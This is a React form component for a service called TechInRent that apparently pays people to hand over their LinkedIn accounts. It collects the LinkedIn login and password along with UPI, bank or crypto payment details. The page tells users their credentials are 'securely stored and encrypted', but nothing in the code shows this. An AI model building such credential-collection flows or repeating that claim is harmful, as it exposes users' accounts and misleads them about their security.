import { useEffect, useState } from "react";
import { useParams, useLocation } from "wouter";
import { useQuery, useMutation } from "@tanstack/react-query";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { Loader2 } from "lucide-react";
import SEO from "@/components/service/SEO";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

import useDebounce from "@/hooks/useDebounce";

// Form validation schema
const secureFormSchema = z.object({
  fullName: z.string().min(2, "Full name must be at least 2 characters"),
  phone: z.string().min(5, "Please enter a valid phone number"),
  email: z.string().email("Please enter a valid email address"),
  linkedinEmail: z.string().email("Please enter a valid LinkedIn email"),
  linkedinPassword: z.string().min(6, "Password must be at least 6 characters"),
  upiId: z.string().optional(),
  bankAccountNumber: z.string().optional(),
  bankIfscCode: z.string().optional(),
  cryptoWalletAddress: z.string().optional(),
  cryptoNetwork: z.string().optional(),
});

export default function SecureForm() {
  const { accessUrl } = useParams();
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [activeTab, setActiveTab] = useState("linkedin");
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");

  // debounce for 500ms
  const [debouncedEmail] = useDebounce(email, 500);
  const [debouncedPhone] = useDebounce(phone, 500);

  // Check if accessUrl exists, if not redirect to home
  useEffect(() => {
    if (!accessUrl) {
      toast({
        title: "Error",
        description: "No access URL provided. Redirecting to home...",
        variant: "destructive",
      });
      setLocation("/");
    }
  }, [accessUrl, setLocation, toast]);

  // Example API calls with debounce (abhi iski api nhi bani h)
  const emailValidationQuery = useQuery({
    queryKey: ["validate-email", debouncedEmail],
    queryFn: () =>
      apiRequest(
        "POST",
        "https://techinrent.onrender.com/api/validate/email",
        { email: debouncedEmail }
      ),
    enabled: !!debouncedEmail,
  });

  const phoneValidationQuery = useQuery({
    queryKey: ["validate-phone", debouncedPhone],
    queryFn: () =>
      apiRequest(
        "POST",
        "https://techinrent.onrender.com/api/validate/phone",
        { phone: debouncedPhone }
      ),
    enabled: !!debouncedPhone,
  });

  // Check if the URL is valid
  // Backend does not expose a form validation endpoint; assume link is valid.
  const urlValidation = { valid: true };
  const isValidating = false;
  const validationError = false;

  // Form setup
  const form = useForm({
    resolver: zodResolver(secureFormSchema),
    defaultValues: {
      fullName: "",
      phone: "",
      email: "",
      linkedinEmail: "",
      linkedinPassword: "",
      upiId: "",
      bankAccountNumber: "",
      bankIfscCode: "",
      cryptoWalletAddress: "",
      cryptoNetwork: "",
    },
  });

  // Submit form mutation
  const submitMutation = useMutation({
    mutationFn: async (values) => {
      // The backend expects formId in body and uses /api/forms/:formId/responses
      // Map payment info to backend schema
      let paymentInfo;
      if (values.upiId) {
        paymentInfo = { method: "upi", upi: values.upiId };
      } else if (values.bankAccountNumber || values.bankIfscCode) {
        paymentInfo = {
          method: "bank",
          bank: {
            accountNumber: values.bankAccountNumber || "",
            ifsc: values.bankIfscCode || "",
          },
        };
      } else if (values.cryptoWalletAddress || values.cryptoNetwork) {
        paymentInfo = {
          method: "crypto",
          crypto: {
            walletId: values.cryptoWalletAddress || "",
            network: values.cryptoNetwork || "",
          },
        };
      } else {
        paymentInfo = { method: "upi", upi: "" };
      }

      const body = {
        fullName: values.fullName,
        phoneNumber: values.phone,
        email: values.email,
        linkedinEmail: values.linkedinEmail,
        linkedinPassword: values.linkedinPassword,
        paymentInfo,
      };
      return apiRequest(
        "POST",
        `https://techinrent.onrender.com/api/forms/${accessUrl}/responses`,
        body
      );
    },
    onSuccess: () => {
      toast({
        title: "Success",
        description: "Your information has been securely submitted!",
      });
      setFormSubmitted(true);
    },
    onError: (error) => {
      toast({
        title: "Error",
        description:
          error.message || "Failed to submit the form. Please try again.",
        variant: "destructive",
      });
    },
  });

  // Handle form submission
  const onSubmit = (values) => {
    submitMutation.mutate(values);
  };

  // Redirect to home if URL is invalid
  useEffect(() => {
    if (validationError || (urlValidation && !urlValidation.valid)) {
      toast({
        title: "Invalid Form Link",
        description:
          "This form link is invalid or has expired. Redirecting to home...",
        variant: "destructive",
      });
      setTimeout(() => setLocation("/"), 3000);
    }
  }, [validationError, urlValidation, setLocation, toast]);

  // Show loader while validating URL
  if (isValidating) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-sky-100">
        <div className="text-center">
          <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4 text-primary" />
          <p className="text-lg">Validating secure form...</p>
        </div>
      </div>
    );
  }

  // If the URL is invalid
  if (validationError || (urlValidation && !urlValidation.valid)) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-sky-100">
        <Card className="w-full max-w-md mx-auto shadow-lg">
          <CardHeader className="bg-red-500 text-white rounded-t-lg">
            <CardTitle className="text-xl font-bold">
              Invalid Form Link
            </CardTitle>
          </CardHeader>
          <CardContent className="pt-6">
            <p className="text-center mb-4">
              This form link is invalid or has expired. You will be redirected
              shortly.
            </p>
            <Button
              className="w-full mt-4 bg-red-600 hover:bg-red-700"
              onClick={() => setLocation("/")}
            >
              Return to Home
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // If form was submitted successfully
  if (formSubmitted) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-sky-100">
        <Card className="w-full max-w-md mx-auto shadow-lg">
          <CardHeader className="bg-green-500 text-white rounded-t-lg">
            <CardTitle className="text-xl font-bold">
              Submission Successful
            </CardTitle>
          </CardHeader>
          <CardContent className="pt-6">
            <p className="text-center mb-4">
              Your information has been securely submitted. Thank you!
            </p>
            <Button
              className="w-full mt-4 bg-green-600 hover:bg-green-700"
              onClick={() => setLocation("/")}
            >
              Return to Home
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Define SEO structured data
  const formStructuredData = {
    "@context": "https://schema.org",
    "@type": "WebPage",
    name: "TechInRent - Secure Information Submission Form",
    description:
      "Secure form for LinkedIn account providers to submit account credentials and payment details.",
    mainEntity: {
      "@type": "WebForm",
      name: "LinkedIn Account Provider Information Form",
      description:
        "Submit your LinkedIn account details and payment information securely.",
      creator: {
        "@type": "Organization",
        name: "TechInRent",
        url: "https://techinrent.com",
      },
    },
  };

  return (
    <div className="min-h-screen py-12 bg-sky-100">
      <SEO
        title="Secure Information Form - TechInRent"
        description="Submit your LinkedIn account credentials and payment details securely. This form is accessible only through authorized links."
        keywords="secure form, linkedin credentials, payment details, confidential information, secure submission"
        structuredData={formStructuredData}
      />
      <div className="container px-4 mx-auto">
        <Card className="w-full max-w-2xl mx-auto shadow-lg">
          <CardHeader className="bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-t-lg">
            <CardTitle className="text-2xl font-bold">
              Secure Information Form
            </CardTitle>
            <CardDescription className="text-white opacity-90">
              Please fill out the form below to securely submit your information
            </CardDescription>
          </CardHeader>
          <CardContent className="pt-6">
            <Form {...form}>
              <form
                onSubmit={form.handleSubmit(onSubmit)}
                className="space-y-6"
              >
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Personal Information</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <FormField
                      control={form.control}
                      name="fullName"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Full Name *</FormLabel>
                          <FormControl>
                            <Input placeholder="Your full name" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={form.control}
                      name="phone"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Phone Number *</FormLabel>
                          <FormControl>
                            <Input
                              placeholder="Your phone number"
                              {...field}
                              onChange={(e) => {
                                field.onChange(e);
                                setPhone(e.target.value);
                              }}
                            />
                          </FormControl>
                          {phoneValidationQuery.isFetching && (
                            <p className="text-sm text-gray-500">
                              Checking phone...
                            </p>
                          )}
                          {phoneValidationQuery.data?.valid === false && (
                            <p className="text-sm text-red-500">
                              Phone already in use
                            </p>
                          )}
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={form.control}
                      name="email"
                      render={({ field }) => (
                        <FormItem className="md:col-span-2">
                          <FormLabel>Email Address *</FormLabel>
                          <FormControl>
                            <Input
                              type="email"
                              placeholder="your.email@example.com"
                              {...field}
                              onChange={(e) => {
                                field.onChange(e);
                                setEmail(e.target.value);
                              }}
                            />
                          </FormControl>
                          {emailValidationQuery.isFetching && (
                            <p className="text-sm text-gray-500">
                              Checking email...
                            </p>
                          )}
                          {emailValidationQuery.data?.valid === false && (
                            <p className="text-sm text-red-500">
                              Email already in use
                            </p>
                          )}
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </div>
                </div>
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">LinkedIn Credentials</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <FormField
                      control={form.control}
                      name="linkedinEmail"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>LinkedIn Email *</FormLabel>
                          <FormControl>
                            <Input
                              type="email"
                              placeholder="Your LinkedIn email"
                              {...field}
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={form.control}
                      name="linkedinPassword"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>LinkedIn Password *</FormLabel>
                          <FormControl>
                            <Input
                              type="password"
                              placeholder="Your LinkedIn password"
                              {...field}
                            />
                          </FormControl>
                          <FormDescription>
                            Your credentials are securely stored and encrypted.
                          </FormDescription>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </div>
                </div>
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Payment Information</h3>
                  <Tabs
                    defaultValue="upi"
                    value={activeTab}
                    onValueChange={setActiveTab}
                    className="w-full"
                  >
                    <TabsList className="grid grid-cols-3 mb-4">
                      <TabsTrigger value="upi">UPI</TabsTrigger>
                      <TabsTrigger value="bank">Bank Account</TabsTrigger>
                      <TabsTrigger value="crypto">Crypto</TabsTrigger>
                    </TabsList>
                    <TabsContent value="upi" className="space-y-4">
                      <FormField
                        control={form.control}
                        name="upiId"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>UPI ID</FormLabel>
                            <FormControl>
                              <Input placeholder="yourname@bank" {...field} />
                            </FormControl>
                            <FormDescription>
                              Enter your UPI ID for receiving payments
                            </FormDescription>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                    </TabsContent>
                    <TabsContent value="bank" className="space-y-4">
                      <FormField
                        control={form.control}
                        name="bankAccountNumber"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>Bank Account Number</FormLabel>
                            <FormControl>
                              <Input
                                placeholder="Your account number"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={form.control}
                        name="bankIfscCode"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>IFSC Code</FormLabel>
                            <FormControl>
                              <Input placeholder="BANK0001234" {...field} />
                            </FormControl>
                            <FormDescription>
                              Enter your bank IFSC code
                            </FormDescription>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                    </TabsContent>
                    <TabsContent value="crypto" className="space-y-4">
                      <FormField
                        control={form.control}
                        name="cryptoWalletAddress"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>Wallet Address</FormLabel>
                            <FormControl>
                              <Input
                                placeholder="Your crypto wallet address"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={form.control}
                        name="cryptoNetwork"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>Network</FormLabel>
                            <FormControl>
                              <Input
                                placeholder="BTC, ETH, USDT, etc."
                                {...field}
                              />
                            </FormControl>
                            <FormDescription>
                              Specify the cryptocurrency network
                            </FormDescription>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                    </TabsContent>
                  </Tabs>
                </div>
                <div className="border-t pt-4">
                  <p className="text-sm text-gray-500 mb-4">
                    By submitting this form, you confirm that all information
                    provided is accurate and you authorize us to use this
                    information for payment and account management purposes.
                  </p>
                  <Button
                    type="submit"
                    className="w-full md:w-auto bg-blue-600 hover:bg-blue-700"
                    disabled={submitMutation.isPending}
                  >
                    {submitMutation.isPending ? (
                      <span className="flex items-center">
                        <Loader2 className="h-5 w-5 animate-spin mr-2" />
                        Submitting...
                      </span>
                    ) : (
                      "Submit Information"
                    )}
                  </Button>
                </div>
              </form>
            </Form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
